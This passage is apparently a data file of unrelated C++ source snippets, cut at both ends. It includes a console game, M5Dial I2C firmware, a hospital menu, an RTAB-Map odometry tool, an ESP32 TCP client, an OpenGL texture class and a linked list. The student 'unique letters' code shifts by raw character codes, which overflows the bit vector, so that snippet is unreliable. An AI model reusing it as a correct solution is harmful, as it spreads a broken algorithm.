highScores[i] << \" - Time: \" << times[i] << \" seconds\\n\";\n    }\n    cout << \"--------------------\\n\";\n}\n\nbool isNumber(const string& str) {\n    for (char const &c : str) {\n        if (isdigit(c) == 0) return false; // \u0e16\u0e49\u0e32\u0e21\u0e35\u0e15\u0e31\u0e27\u0e2d\u0e31\u0e01\u0e29\u0e23\u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e43\u0e0a\u0e48\u0e40\u0e25\u0e02 \u0e08\u0e30\u0e04\u0e37\u0e19\u0e04\u0e48\u0e32 false\n    }\n    return true; // \u0e04\u0e37\u0e19\u0e04\u0e48\u0e32 true \u0e2b\u0e32\u0e01\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e40\u0e25\u0e02\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\n}\n\nint main() {\n    while (true) {\n        // \u0e41\u0e2a\u0e14\u0e07\u0e40\u0e21\u0e19\u0e39\u0e17\u0e38\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07\u0e01\u0e48\u0e2d\u0e19\u0e40\u0e23\u0e34\u0e48\u0e21\u0e40\u0e01\u0e21\n        displayMenu();\n        \n        string input;\n        int choice = 0;\n\n        cout << \"Choose a mode: \";\n        cin >> input;\n\n        // \u0e14\u0e31\u0e01\u0e04\u0e48\u0e32\u0e01\u0e32\u0e23\u0e01\u0e23\u0e2d\u0e01\u0e17\u0e35\u0e48\u0e44\u0e21\u0e48\u0e43\u0e0a\u0e48\u0e15\u0e31\u0e27\u0e40\u0e25\u0e02\n        if (!isNumber(input) || (choice = stoi(input)) < 1 || choice > 5) {\n            cout << \"Invalid input, please enter a number between 1 and 5.\\n\";\n            continue;\n        }\n\n        if (choice == 5) {\n            cout << \"Exiting the game.\\n\";\n            break;\n        } else if (choice == 4) {\n            // \u0e41\u0e2a\u0e14\u0e07\u0e04\u0e30\u0e41\u0e19\u0e19\u0e2a\u0e39\u0e07\u0e2a\u0e38\u0e14\n            displayHighScores();\n            continue;\n        }\n    \n        // \u0e16\u0e32\u0e21\u0e0a\u0e37\u0e48\u0e2d\u0e1c\u0e39\u0e49\u0e40\u0e25\u0e48\u0e19\u0e43\u0e2b\u0e21\u0e48\u0e17\u0e38\u0e01\u0e04\u0e23\u0e31\u0e49\u0e07\u0e40\u0e21\u0e37\u0e48\u0e2d\u0e40\u0e25\u0e37\u0e2d\u0e01\u0e42\u0e2b\u0e21\u0e14\u0e40\u0e01\u0e21\n        string playerName;\n        cout << \"Enter your name: \";\n        cin >> playerName;\n\n        // \u0e40\u0e23\u0e34\u0e48\u0e21\u0e08\u0e31\u0e1a\u0e40\u0e27\u0e25\u0e32\n        clock_t start = clock();\n\n        // \u0e40\u0e25\u0e48\u0e19\u0e40\u0e01\u0e21\u0e15\u0e32\u0e21\u0e42\u0e2b\u0e21\u0e14\u0e17\u0e35\u0e48\u0e40\u0e25\u0e37\u0e2d\u0e01\n        int score = playGame(choice);\n\n        // \u0e08\u0e1a\u0e08\u0e31\u0e1a\u0e40\u0e27\u0e25\u0e32\n        clock_t end = clock();\n        double timeTaken = double(end - start) / CLOCKS_PER_SEC;\n\n        // \u0e41\u0e2a\u0e14\u0e07\u0e04\u0e30\u0e41\u0e19\u0e19\u0e02\u0e2d\u0e07\u0e1c\u0e39\u0e49\u0e40\u0e25\u0e48\u0e19\n        cout << \"Your score is: \" << score << endl;\n        cout << \"Time taken: \" << timeTaken << \" seconds\\n\";\n\n        // \u0e2d\u0e31\u0e1b\u0e40\u0e14\u0e15\u0e04\u0e30\u0e41\u0e19\u0e19\u0e2a\u0e39\u0e07\u0e2a\u0e38\u0e14\n        ",
    "#include <Wire.h>\r\n#include <M5Dial.h>\r\n//#include <USBSerial.h> \r\n\r\n#define I2C_SLAVE_ADDR 0x60\r\n\r\ntypedef struct __attribute__((packed))\r\n{\r\n    int32_t pos_x = 0;\r\n    int32_t pos_y = 0;\r\n    int32_t pos_z = 0;\r\n    int32_t pos_a = 0;\r\n} DialData;\r\n\r\n\r\n\r\n// Array to store X, Y, Z, A positions\r\nlong positions[4] = {0, 0, 0, 0};\r\nchar axisNames[4] = {'X', 'Y', 'Z', 'A'};\r\nint  currentAxis  = 0; // 0=X, 1=Y, 2=Z, 3=A\r\nint  stepSize     = 1; // Step size starts at 1\r\nlong encoderPos   = -999;\r\n\r\n// Available touch states\r\nconst int TOUCH_BEGIN      = 3; // Represents touch start\r\nconst int TOUCH_HOLD_BEGIN = 7; // Represents touch hold start\r\n\r\nvoid requestEvent();\r\n\r\nunsigned long       touchStartTime      = 0;\r\nbool                isLongPress         = false;\r\nconst unsigned long LONG_PRESS_DURATION = 150; // 1 second for long press\r\n\r\nvoid setup()\r\n{\r\n    USBSerial.begin(115200);\r\n    auto cfg = M5.config();\r\n    M5Dial.begin(cfg, true, false);\r\n\r\n    M5Dial.Display.setTextColor(WHITE);\r\n    M5Dial.Display.setTextDatum(middle_center);\r\n    M5Dial.Display.setTextFont(&fonts::Orbitron_Light_32);\r\n    M5Dial.Display.setTextSize(1);\r\n    M5Dial.Display.drawString(\"X=\" + String(positions[currentAxis]), M5Dial.Display.width() / 2,\r\n                              M5Dial.Display.height() / 2);\r\n    Wire.begin(I2C_SLAVE_ADDR, 13, 15, 400000); // Start I2C communication as slave\r\n    Wire.onRequest(requestEvent); // Register event to send data when requested by the master\r\n\r\n}\r\n\r\nvoid requestEvent()\r\n{\r\n    // Send the positions array over I2C when requested\r\n    DialData data;\r\n    data.pos_x = positions[0];\r\n    data.pos_y = positions[1];\r\n    data.pos_z = positions[2];\r\n    data.pos_a = positions[3];\r\n\r\n    Wire.write((uint8_t*)&data, sizeof(DialData));\r\n    USBSerial.printf(\"Sent positions: %d, %d, %d, %d\\n\", positions[0], positions[1], positions[2], positions[3]);\r\n}\r\n\r\nvoid updateDisplay()\r\n{\r\n    M5Dial.Display.clear();\r\n    M5Dial.Display.drawString(String(axisNames[currentAxis]) + \"=\" + String(positions[currentAxis]),\r\n                              M5Dial.Display.width() / 2, M5Dial.Display.height() / 2);\r\n    M5Dial.Display.drawString(\"Step: \" + String(stepSize), M5Dial.Display.width() / 2,\r\n                              M5Dial.Display.height() / 2 + 30);\r\n}\r\n\r\nvoid loop()\r\n{\r\n    M5Dial.update();\r\n\r\n    long newEncoderPos = M5Dial.Encoder.read();\r\n    if (newEncoderPos != encoderPos)\r\n    {\r\n        positions[currentAxis] += (newEncoderPos - encoderPos) * stepSize;\r\n        encoderPos = newEncoderPos;\r\n        updateDisplay();\r\n    }\r\n\r\n    auto t = M5Dial.Touch.getDetail();\r\n\r\n    // Handle touch begin\r\n    if (t.state == 3)\r\n    { // TOUCH_BEGIN\r\n        touchStartTime = millis();\r\n    }\r\n\r\n    // Handle touch end\r\n    if (t.state == 2 or t.state == 7)\r\n    { // TOUCH_END\r\n        long touchDuration = millis() - touchStartTime;\r\n        USBSerial.printf(\"Touch duration: %d\\n\", touchDuration);\r\n        if (touchDuration < LONG_PRESS_DURATION)\r\n        {\r\n            // Short press: switch axis\r\n            currentAxis = (currentAxis + 1) % 4;\r\n            updateDisplay();\r\n        }\r\n        else if (touchDuration >= 100)\r\n        {\r\n            // Long press: change step size\r\n            if (stepSize == 1)\r\n            {\r\n                stepSize = 10;\r\n            }\r\n            else if (stepSize == 10)\r\n            {\r\n                stepSize = 100;\r\n            }\r\n            else if (stepSize == 100)\r\n            {\r\n                stepSize = 1000;\r\n            }\r\n            else\r\n            {\r\n                stepSize = 1;\r\n            }\r\n            updateDisplay();\r\n        }\r\n    }\r\n}",
    "#include <iostream>\n#include <bits/stdc++.h>\n#include <vector>\n#include <string>\n\nusing namespace std;\n\n// Define a structure to represent a patient\nstruct Patient {\n    string name;\n    int age;\n    string gender;\n    string illness;\n};\n\n// Define a structure to represent a doctor\nstruct Doctor {\n    string name;\n    string specialization;\n};\n\n// Define a structure to represent a hospital\nstruct Hospital {\n    string name;\n    vector<Doctor> doctors;\n    vector<Patient> patients;\n};\n\n// Function to add a new patient to the hospital\nvoid addPatient(Hospital& hospital) {\n    Patient newPatient;\n    cout << \"Enter patient name: \";\n    cin.ignore(); // Ignore the newline character left by cin\n    getline(cin, newPatient.name);\n    cout << \"Enter patient age: \";\n    cin >> newPatient.age;\n    cout << \"Enter patient gender: \";\n    cin.ignore(); // Ignore the newline character left by cin\n    getline(cin, newPatient.gender);\n    cout << \"Enter patient illness: \";\n    getline(cin, newPatient.illness);\n\n    hospital.patients.push_back(newPatient);\n    cout << \"Patient added successfully!\" << endl;\n}\n\n// Function to add a new doctor to the hospital\nvoid addDoctor(Hospital& hospital) {\n    Doctor newDoctor;\n    cout << \"Enter doctor name: \";\n    cin.ignore(); // Ignore the newline character left by cin\n    getline(cin, newDoctor.name);\n    cout << \"Enter doctor's specialization: \";\n    getline(cin, newDoctor.specialization);\n\n    hospital.doctors.push_back(newDoctor);\n    cout << \"Doctor added successfully!\" << endl;\n}\n\n// Function to display all patients in the hospital\nvoid displayPatients(const Hospital& hospital) {\n    cout << \"\\nPatients:\" << endl;\n    cout << \"-----------------------------------\" << endl;\n    for (const auto& patient : hospital.patients) {\n        cout << \"Name: \" << patient.name << \", Age: \" << patient.age << \", Gender: \" << patient.gender << \", Illness: \" << patient.illness << endl;\n    }\n    cout << \"-----------------------------------\" << endl;\n}\n\n// Function to display all doctors in the hospital\nvoid displayDoctors(const Hospital& hospital) {\n    cout << \"\\nDoctors:\" << endl;\n    cout << \"-----------------------------------\" << endl;\n    for (const auto& doctor : hospital.doctors) {\n        cout << \"Name: \" << doctor.name << \", Specialization: \" << doctor.specialization << endl;\n    }\n    cout << \"-----------------------------------\" << endl;\n}\n\nint main() {\n    Hospital hospital;\n    hospital.name = \"ABC Hospital\";\n\n    int choice;\n\n    do {\n        cout << \"\\nHospital Management System\\n\";\n        cout << \"1. Add Patient\\n\";\n        cout << \"2. Add Doctor\\n\";\n        cout << \"3. Display Patients\\n\";\n        cout << \"4. Display Doctors\\n\";\n        cout << \"5. Exit\\n\";\n        cout << \"Enter your choice: \";\n        cin >> choice;\n\n        switch (choice) {\n            case 1:\n                addPatient(hospital);\n                break;\n            case 2:\n                addDoctor(hospital);\n                break;\n            case 3:\n                displayPatients(hospital);\n                break;\n            case 4:\n                displayDoctors(hospital);\n                break;\n            case 5:\n                cout << \"Exiting...\";\n                break;\n            default:\n                cout << \"Invalid choice. Please enter a number from 1 to 5.\" << endl;\n        }\n    } while (choice != 5);\n\n    return 0;\n}",
    "/*\r\nCopyright (c) 2010-2016, Mathieu Labbe - IntRoLab - Universite de Sherbrooke\r\nAll rights reserved.\r\n\r\nRedistribution and use in source and binary forms, with or without\r\nmodification, are permitted provided that the following conditions are met:\r\n    * Redistributions of source code must retain the above copyright\r\n      notice, this list of conditions and the following disclaimer.\r\n    * Redistributions in binary form must reproduce the above copyright\r\n      notice, this list of conditions and the following disclaimer in the\r\n      documentation and/or other materials provided with the distribution.\r\n    * Neither the name of the Universite de Sherbrooke nor the\r\n      names of its contributors may be used to endorse or promote products\r\n      derived from this software without specific prior written permission.\r\n\r\nTHIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS \"AS IS\" AND\r\nANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED\r\nWARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE\r\nDISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY\r\nDIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES\r\n(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;\r\nLOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND\r\nON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT\r\n(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS\r\nSOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.\r\n*/\r\n\r\n#include <rtabmap/utilite/ULogger.h>\r\n#include <rtabmap/utilite/UEventsManager.h>\r\n#include <rtabmap/utilite/UFile.h>\r\n#include <rtabmap/utilite/UConversion.h>\r\n#include <rtabmap/utilite/UStl.h>\r\n#include <rtabmap/core/Odometry.h>\r\n#include <rtabmap/core/odometry/OdometryMono.h>\r\n#include <rtabmap/core/OdometryThread.h>\r\n#include <rtabmap/gui/OdometryViewer.h>\r\n#include <rtabmap/core/CameraRGBD.h>\r\n#include <rtabmap/core/CameraStereo.h>\r\n#include <rtabmap/core/DBReader.h>\r\n#include <rtabmap/core/VWDictionary.h>\r\n#include <QApplication>\r\n#include <QPushButton>\r\n#include <pcl/console/print.h>\r\n#include <rtabmap/core/SensorCaptureThread.h>\r\n\r\nvoid showUsage()\r\n{\r\n\tprintf(\"\\nUsage:\\n\"\r\n\t\t\t\"odometryViewer [options]\\n\"\r\n\t\t\t\"Options:\\n\"\r\n\t\t\t\"  -driver #                 Driver number to use: \\n\"\r\n\t\t\t\"                                     0=OpenNI-PCL (Kinect)\\n\"\r\n\t\t\t\"                                     1=OpenNI2    (Kinect and Xtion PRO Live)\\n\"\r\n\t\t\t\"                                     2=Freenect   (Kinect)\\n\"\r\n\t\t\t\"                                     3=OpenNI-CV  (Kinect)\\n\"\r\n\t\t\t\"                                     4=OpenNI-CV-ASUS (Xtion PRO Live)\\n\"\r\n\t\t\t\"                                     5=Freenect2  (Kinect v2)\\n\"\r\n\t\t\t\"                                     6=DC1394     (Bumblebee2)\\n\"\r\n\t\t\t\"                                     7=FlyCapture2 (Bumblebee2)\\n\"\r\n\t\t\t\"                                     8=ZED stereo\\n\"\r\n\t\t\t\"                                     9=RealSense\\n\"\r\n\t\t\t\"                                     10=Kinect for Windows 2 SDK\\n\"\r\n\t\t\t\"                                     11=RealSense2\\n\"\r\n\t\t\t\"                                     12=Kinect for Azure SDK\\n\"\r\n\t\t\t\"                                     13=MYNT EYE S\\n\"\r\n\t\t\t\"  -hz #.#                   Camera rate (default 0, 0 means as fast as the camera can)\\n\"\r\n\t\t\t\"  -db \\\"input.db\\\"            Use database instead of camera (recorded with rtabmap-dataRecorder)\\n\"\r\n\t\t\t\"  -clouds #                 Maximum clouds shown (default 10, zero means inf)\\n\"\r\n\t\t\t\"  -sec #.#                  Delay (seconds) before reading the database (if set)\\n\"\r\n\t\t\t\"%s\\n\",\r\n\t\t\trtabmap::Parameters::showUsage());\r\n\texit(1);\r\n}\r\n\r\nint main (int argc, char * argv[])\r\n{\r\n\tULogger::setType(ULogger::kTypeConsole);\r\n\tULogger::setLevel(ULogger::kInfo);\r\n\r\n\t// parse arguments\r\n\tfloat rate = 0.0;\r\n\tstd::string inputDatabase;\r\n\tint driver = 0;\r\n\tint maxClouds = 10;\r\n\tfloat sec = 0.0f;\r\n\r\n\tfor(int i=1; i<argc; ++i)\r\n\t{\r\n\t\tif(strcmp(argv[i], \"-driver\") == 0)\r\n\t\t{\r\n\t\t\t++i;\r\n\t\t\tif(i < argc)\r\n\t\t\t{\r\n\t\t\t\tdriver = std::atoi(argv[i]);\r\n\t\t\t\tif(driver < 0 || driver > 13)\r\n\t\t\t\t{\r\n\t\t\t\t\tshowUsage();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tshowUsage();\r\n\t\t\t}\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif(strcmp(argv[i], \"-hz\") == 0)\r\n\t\t{\r\n\t\t\t++i;\r\n\t\t\tif(i < argc)\r\n\t\t\t{\r\n\t\t\t\trate = uStr2Float(argv[i]);\r\n\t\t\t\tif(rate < 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tshowUsage();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tshowUsage();\r\n\t\t\t}\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif(strcmp(argv[i], \"-db\") == 0)\r\n\t\t{\r\n\t\t\t++i;\r\n\t\t\tif(i < argc)\r\n\t\t\t{\r\n\t\t\t\tinputDatabase = argv[i];\r\n\t\t\t\tif(UFile::getExtension(inputDatabase).compare(\"db\") != 0)\r\n\t\t\t\t{\r\n\t\t\t\t\tprintf(\"Database path (%s) should end with \\\"db\\\" \\n\", inputDatabase.c_str());\r\n\t\t\t\t\tshowUsage();\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tshowUsage();\r\n\t\t\t}\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif(strcmp(argv[i], \"-clouds\") == 0)\r\n\t\t{\r\n\t\t\t++i;\r\n\t\t\tif(i < argc)\r\n\t\t\t{\r\n\t\t\t\tmaxClouds = std::atoi(ar",
    "/*******************************************************************************\n * Name        : unique.cpp\n * Author      : \n * Date        : \n * Description : Determining uniqueness of chars with int as bit vector.\n * Pledge      :\n ******************************************************************************/\n#include <iostream>\n#include <cctype>\n\nusing namespace std;\n\nbool is_all_lowercase(const string &s) {\n    // TODO: returns true if all characters in string are lowercase\n    // letters in the English alphabet; false otherwise.\n\n    for(int i = 0; i < s.length(); i++){\n        if(s[i] < 'a' or s[i] > 'z'){\n            return false;\n        }\n    }\n    return true;\n}\n\nbool all_unique_letters(const string &s) {\n    // TODO: returns true if all letters in string are unique, that is\n    // no duplicates are found; false otherwise.\n\n    // You MUST use only single unsigned integers and work with bitwise\n    // and bitshifting operators only.  Using any other kind of solution\n    // will automatically result in a grade of ZERO for the whole assignment.\n\n    unsigned int bit_vector = 0;\n    for(int i = 0; i < s.length(); i++){\n        if(bit_vector & (1 << s[i])){\n            return false;\n        }\n        bit_vector |= 1 << s[i];\n    }\n    return true;\n}\n\nint main(int argc, char * const argv[]) {\n    // TODO: reads and parses command line arguments.\n    // Calls other functions to produce correct output.\n\n    if (argc != 2) {  // Check if exactly one argument is provided\n        cout << \"Usage: ./unique <string>\" << endl;\n        return 1;\n    }\n\n    if (!is_all_lowercase(argv[1])) {  // Validate if the input contains only lowercase letters\n        cout << \"Error: String must contain only lowercase letters.\" << endl;\n        return 1;\n    }\n\n    if (all_unique_letters(argv[1])) {  // Check for unique characters\n        cout << \"All letters are unique.\" << endl;\n    } else {\n        cout << \"Duplicate letters found.\" << endl;\n    }\n    return 0;\n}\n",
    "/*!\r\n\t\\file\r\n\t\\brief \u041a\u043b\u0430\u0441\u0441 \u0437\u0430\u0434\u0430\u0447\u0438 \u0434\u043b\u044f TCP \u043a\u043b\u0438\u0435\u043d\u0442\u0430.\r\n\t\\authors \u0411\u043b\u0438\u0437\u043d\u0435\u0446 \u0420.\u0410. (r.bliznets@gmail.com)\r\n\t\\version 0.0.0.1\r\n\t\\date 16.09.2024\r\n*/\r\n\r\n#include \"CTCPClientTask.h\"\r\n#include \"CTrace.h\"\r\n#include <cstring>\r\n\r\nstatic const char *TAG = \"tcp\";\r\n\r\nCTCPClientTask::CTCPClientTask(WiFiStation *parent, uint32_t &addr, uint16_t &port) : CBaseTask(), mParent(parent)\r\n{\r\n\tstd::memset(&src_addr, 0, sizeof(src_addr));\r\n\tsrc_addr.sin_family = AF_INET;\r\n\tsrc_addr.sin_port = htons(port);\r\n\tsrc_addr.sin_addr.s_addr = addr;\r\n\r\n\tCBaseTask::init(TCPCLIENTTASK_NAME, TCPCLIENTTASK_STACKSIZE, TCPCLIENTTASK_PRIOR, TCPCLIENTTASK_LENGTH, TCPCLIENTTASK_CPU);\r\n}\r\n\r\nCTCPClientTask::~CTCPClientTask()\r\n{\r\n\tif (m_sock >= 0)\r\n\t{\r\n\t\tmConnected = -1;\r\n\t\tshutdown(m_sock, 0);\r\n\t\tclose(m_sock);\r\n\t\tdo\r\n\t\t{\r\n\t\t\tvTaskDelay(1);\r\n\t\t} while (mTaskQueue != nullptr);\r\n\t\t// ESP_LOGI(TAG, \"Socket delete\");\r\n\t\tvTaskDelay(1);\r\n\t}\r\n}\r\n\r\nvoid CTCPClientTask::run()\r\n{\r\n#ifndef CONFIG_FREERTOS_CHECK_STACKOVERFLOW_NONE\r\n\tUBaseType_t m1 = uxTaskGetStackHighWaterMark2(nullptr);\r\n#endif\r\n\tfor (;;)\r\n\t{\r\n\t\tm_sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);\r\n\t\tif (m_sock < 0)\r\n\t\t{\r\n\t\t\tESP_LOGE(TAG, \"Unable to create socket: errno %d\", errno);\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tint err = connect(m_sock, (struct sockaddr *)&src_addr, sizeof(src_addr));\r\n\t\tif (err != 0)\r\n\t\t{\r\n\t\t\tESP_LOGW(TAG, \"Socket unable to connect: errno %d\", errno);\r\n\t\t\tif (mConnected == -1)\r\n\t\t\t\tbreak;\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tclose(m_sock);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t}\r\n\r\n\t\tmConnected = 1;\r\n\t\tfor (;;)\r\n\t\t{\r\n\t\t\tint len = recv(m_sock, rx_buffer, sizeof(rx_buffer) - 1, 0);\r\n\t\t\tif (len < 0)\r\n\t\t\t{\r\n\t\t\t\t// TDEC(\"errno\",errno);\r\n\t\t\t\tif (errno == ENOTCONN)\r\n\t\t\t\t{\r\n\t\t\t\t\tclose(m_sock);\r\n\t\t\t\t\tif (mConnected == 1)\r\n\t\t\t\t\t\tmConnected = 0;\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\t// else if(errno == EHOSTUNREACH)\r\n\t\t\t\t// {\r\n\t\t\t\t// \tclose(m_sock);\r\n\t\t\t\t// \tmConnected = 0;\r\n\t\t\t\t// \tbreak;\r\n\t\t\t\t// }\r\n\t\t\t}\r\n\t\t\telse\r\n\t\t\t{\r\n\t\t\t\tif (mParent->mClientDataRxCallback != nullptr)\r\n\t\t\t\t\tmParent->mClientDataRxCallback(src_addr.sin_addr.s_addr, src_addr.sin_port, rx_buffer, len);\r\n\t\t\t\telse\r\n\t\t\t\t\tTRACEDATA(\"rx\", rx_buffer, len);\r\n\t\t\t}\r\n#ifndef CONFIG_FREERTOS_CHECK_STACKOVERFLOW_NONE\r\n\t\t\tUBaseType_t m2 = uxTaskGetStackHighWaterMark2(nullptr);\r\n\t\t\tif (m2 != m1)\r\n\t\t\t{\r\n\t\t\t\tm1 = m2;\r\n\t\t\t\tTDEC(\"free tcp stack\", m2);\r\n\t\t\t}\r\n#endif\r\n\t\t}\r\n\t\tif (mConnected == -1)\r\n\t\t\tbreak;\r\n\t}\r\n}\r\n\r\nbool CTCPClientTask::sendData(uint8_t *data, uint16_t len)\r\n{\r\n\tif ((m_sock < 0) || (mConnected != 1))\r\n\t\treturn false;\r\n\r\n\tif (send(m_sock, data, len, 0) < 0)\r\n\t{\r\n\t\tESP_LOGE(TAG, \"Error occurred during sending: errno %d\", errno);\r\n\t\treturn false;\r\n\t}\r\n\telse\r\n\t\treturn true;\r\n}",
    "#include \"opengl/texture.hpp\"\n\n#include <iostream>\n\n#include \"opengl/gl_errors.hpp\"\n\nGLenum gl_magnification_filter = GL_LINEAR;\nGLenum gl_minification_filter = GL_LINEAR;\nGLenum gl_texture_wrap_s = GL_CLAMP_TO_EDGE;\nGLenum gl_texture_wrap_t = GL_CLAMP_TO_EDGE;\n\ntemplate <typename Enumeration>\nauto as_integer(Enumeration const value)\n    -> typename std::underlying_type<Enumeration>::type\n{\n    return static_cast<typename std::underlying_type<Enumeration>::type>(value);\n}\n\nstruct PixelFormat {\n    GLenum format;\n    GLenum type;\n};\n\nstatic PixelFormat gl_pixel_format(GL::PixelFormat format)\n{\n    switch (format) {\n\n    case GL::PixelFormat::R8G8B8:\n        return {\n            .format = GL_RGB,\n            .type = GL_UNSIGNED_BYTE,\n        };\n\n    case GL::PixelFormat::R8G8B8A8:\n        return {\n            .format = GL_RGBA,\n            .type = GL_UNSIGNED_BYTE,\n        };\n\n    default:\n        std::cerr << \"FATAL ERROR: invalid pixel format: \"\n                  << as_integer(format) << \"\\n\";\n        throw;\n    }\n}\n\nstatic GLenum gl_texture_type(GL::TextureType type)\n{\n    switch (type) {\n\n    case GL::TextureType::TWO_DIMS:\n        return GL_TEXTURE_2D;\n    case GL::TextureType::THREE_DIMS:\n        return GL_TEXTURE_3D;\n\n    default:\n        std::cerr << \"FATAL ERROR: invalid texture type: \"\n                  << as_integer(type) << \"\\n\";\n        throw;\n    }\n}\n\nnamespace GL {\n\nTexture::Texture(unsigned char* pixels, std::size_t width, std::size_t height,\n                 PixelFormat pixel_format, TextureType type)\n{\n    m_type = type;\n\n    gl(GenTextures, (1, &m_id));\n\n    gl(BindTexture, (gl_texture_type(type), m_id));\n\n    // Set parameters\n    gl(TexParameteri, (gl_texture_type(type), GL_TEXTURE_MIN_FILTER, gl_minification_filter));\n    gl(TexParameteri, (gl_texture_type(type), GL_TEXTURE_MAG_FILTER, gl_magnification_filter));\n    gl(TexParameteri, (gl_texture_type(type), GL_TEXTURE_WRAP_S, gl_texture_wrap_s));\n    gl(TexParameteri, (gl_texture_type(type), GL_TEXTURE_WRAP_T, gl_texture_wrap_t));\n\n    // Upload texture data\n    auto format = gl_pixel_format(pixel_format);\n    gl(TexImage2D, (gl_texture_type(type), 0, GL_RGBA8, width, height, 0, format.format, format.type, pixels));\n\n    gl(BindTexture, (gl_texture_type(type), 0));\n}\n\nTexture::~Texture()\n{\n    gl(DeleteTextures, (1, &m_id));\n}\n\nvoid Texture::bind(GLuint slot) const\n{\n    gl(ActiveTexture, (GL_TEXTURE0 + slot));\n    gl(BindTexture, (gl_texture_type(m_type), m_id));\n}\n\nvoid Texture::unbind() const\n{\n    gl(ActiveTexture, (GL_TEXTURE0));\n    gl(BindTexture, (gl_texture_type(m_type), 0));\n}\n\nvoid set_magnification_filter(GLenum filter) { gl_magnification_filter = filter; }\nvoid set_minification_filter(GLenum filter) { gl_minification_filter = filter; }\nvoid set_texture_wrap_s(GLenum wrap) { gl_texture_wrap_s = wrap; }\nvoid set_texture_wrap_t(GLenum wrap) { gl_texture_wrap_t = wrap; }\n\n}\n",
    "#include <iostream>\nusing namespace std;\n\nstruct Node {\n    int data;\n    Node* next;\n};\n\nvoid insertNode(Node*& head, int value) {\n    Node* newNode = new Node();\n    newNode->data = value;\n    newNode->next = nullptr;\n\n    if (head == nullptr) {\n        head = newNode;\n    } else {\n        Node* temp = head;\n        while (temp->next != nullptr) {\n            temp = temp->next;\n        }\n        temp->next = newNode;\n    }\n}\n\nvoid deleteNode(Node*& head, int value) {\n    if (head == nullptr) {\n        cout << \"List is empty.\" << endl;\n        return;\n    }\n\n    Node* temp = head;\n    Node* prev = nullptr;\n\n    if (temp != nullptr && temp->data == value) {\n        head = temp->next;\n        delete temp;\n        return;\n    }\n\n    while (temp != nullptr && temp->data != value) {\n        prev = temp;\n        temp = temp->next;\n    }\n\n    if (temp == nullptr) {\n        cout << \"Value not found in the list.\" << endl;\n        return;\n    }\n\n    prev->next = temp->next;\n    delete temp;\n}\n\nvoid displayList(Node* head) {\n    Node* temp = head;\n    while (temp != nullptr) {\n        cout << temp->data;\n        if (temp->next != nullptr) {\n            cout << \"->\";\n        }\n        temp = temp->next;\n    }\n    cout << endl;\n}\n\nint main() {\n    Node* head = nullptr;\n    int n, value;\n\n    cout << \"Enter number of elements : \";\n    cin >> n;\n\n    cout << \"Enter the elements : \" << endl;\n    for (int i = 0; i < n; i++) {\n        int element;\n        cin >> element;\n        insertNode(head, element);\n    }\n\n    cout << \"value to be deleted: \";\n    cin >> value;\n\n    deleteNode(head, value);\n\n    cout << \"Updated linked list: \";\n    displayList(head);\n\n    return 0;\n}\n",
    "#include <cstdlib>\n#include <iostream>\n//#include <matplot/matplot.h>\n#include <vector>\n#include <fstream>\n\nusing namespace std;\n\n// double *T = nullptr;\n// double *TT = nullptr;\n// double *x = nullptr;\n// double *y = nullptr;\n\nint main()\n{\n    setlocale(0, \"\");\n\n    int n;\n    double h, xbeg, xend, t_end;\n    const int k = 100, T0 = 10, Tc = 100;\n\n    cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043a\u043e\u043b\u0438\u0447\u0435\u0441\u0442\u0432\u043e \u0442\u043e\u0447\u0435\u043a \u043d\u0430 \u0438\u043d\u0442\u0435\u0440\u0432\u0430\u043b\u0435 (<=100) n=\";\n    cin >> n;\n\n    if (n <= 0 || n > 100) {\n        cout << \"\u041d\u0435\u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 n. \u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0432 \u043f\u0440\u0435\u0434\u0435\u043b\u0430\u0445 (0, 100].\" << endl;\n        return -1;\n    }\n\n    cout << \"x \u0438 y-\u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u043d\u0430\u0447\u0430\u043b\u0430 \u0438\u043d\u0442\u0435\u0440\u0432\u0430\u043b\u043e\u0432=\";\n    cin >> xbeg;\n    cout << \"x \u0438 y-\u043a\u043e\u043e\u0440\u0434\u0438\u043d\u0430\u0442\u044b \u043a\u043e\u043d\u0446\u0430 \u0438\u043d\u0442\u0435\u0440\u0432\u0430\u043b\u043e\u0432=\";\n    cin >> xend;\n    h = (xend - xbeg) / (n - 1); // 5/2 = 2.5\n\n    cout << 